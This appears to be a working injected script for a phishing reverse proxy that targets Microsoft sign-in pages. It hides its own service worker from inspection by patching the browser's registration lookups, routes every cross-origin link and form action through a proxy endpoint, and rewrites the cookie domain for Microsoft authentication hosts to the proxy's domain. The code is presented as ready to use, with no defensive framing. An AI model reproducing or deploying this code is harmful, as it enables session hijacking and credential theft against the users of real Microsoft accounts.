// ============================================================
// PATCHED SCRIPT – SW hiding + MutationObserver + Cookie Domain Rewriter
// ============================================================
console.log('[DOM SCRIPT] Patched version loaded');

// ---- 1. Hide Service Worker ----
(function () {
    const originalGetRegistration = navigator.serviceWorker.getRegistration;
    navigator.serviceWorker.getRegistration = function (_scope) {
        return originalGetRegistration.apply(this, arguments)
            .then(registration => {
                if (registration &&
                    registration.active &&
                    registration.active.scriptURL &&
                    registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js")) {
                    return undefined;
                }
                return registration;
            });
    };
})();

(function () {
    const originalGetRegistrations = navigator.serviceWorker.getRegistrations;
    navigator.serviceWorker.getRegistrations = function () {
        return originalGetRegistrations.apply(this, arguments)
            .then(registrations => {
                return registrations.filter(registration => {
                    return !(registration.active &&
                        registration.active.scriptURL &&
                        registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js"));
                });
            });
    };
})();

// ---- 2. MutationObserver for href/action rewriting ----
const observer = new MutationObserver((mutations) => {
    for (const mutation of mutations) {
        if (mutation.type === "attributes") {
            updateHTMLAttribute(mutation.target, mutation.attributeName);
        } else if (mutation.type === "childList") {
            for (const node of mutation.addedNodes) {
                for (const attribute of attributes) {
                    if (node[attribute]) {
                        updateHTMLAttribute(node, attribute);
                    }
                }
            }
        }
    }
});

const attributes = ["href", "action"];
observer.observe(document.documentElement, {
    childList: true,
    subtree: true,
    attributeFilter: attributes
});

function updateHTMLAttribute(htmlNode, htmlAttribute) {
    try {
        const htmlAttributeURL = new URL(htmlNode[htmlAttribute]);
        if (htmlAttributeURL.origin !== self.location.origin) {
            const proxyRequestURL = new URL(`${self.location.origin}/Mutation_o5y3f4O7jMGW`);
            proxyRequestURL.searchParams.append("redirect_urI", encodeURIComponent(htmlAttributeURL.href));
            htmlNode[htmlAttribute] = proxyRequestURL;
        }
    } catch { }
}

// ---- 3. Cookie Domain Rewriter (targets all Microsoft domains) ----
(function() {
    const originalDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
    const originalSet = originalDescriptor.set;
    const originalGet = originalDescriptor.get;
    const proxyDomain = window.__originalHostname || window.location.hostname;

    // List of Microsoft domains we want to rewrite
    const microsoftDomains = [
        'login.microsoftonline.com',
        'microsoftonline.com',
        'login.windows.net',
        'login.microsoft.com',
        'aadcdn.msftauth.net',
        'sts.microsoftonline.com'
    ];

    // Build a regex that matches any of these domains
    const domainPattern = new RegExp(
        '\\bDomain\\s*=\\s*(' + microsoftDomains.join('|').replace(/\./g, '\\.') + ')',
        'i'
    );

    Object.defineProperty(document, 'cookie', {
        get: originalGet,
        set: function(value) {
            let newValue = value;
            if (value && domainPattern.test(value)) {
                // Replace the Domain attribute with the proxy domain
                newValue = value.replace(domainPattern, `Domain=${proxyDomain}`);
                // If no Domain attribute was present, add it (fallback)
                if (!/Domain\s*=/i.test(newValue)) {
                    newValue += `; Domain=${proxyDomain}`;
                }
            }
            originalSet.call(document, newValue);
        },
        configurable: true
    });
    console.log('[Cookie Patch] Active – cookies for Microsoft domains will be rewritten to:', proxyDomain);
})();
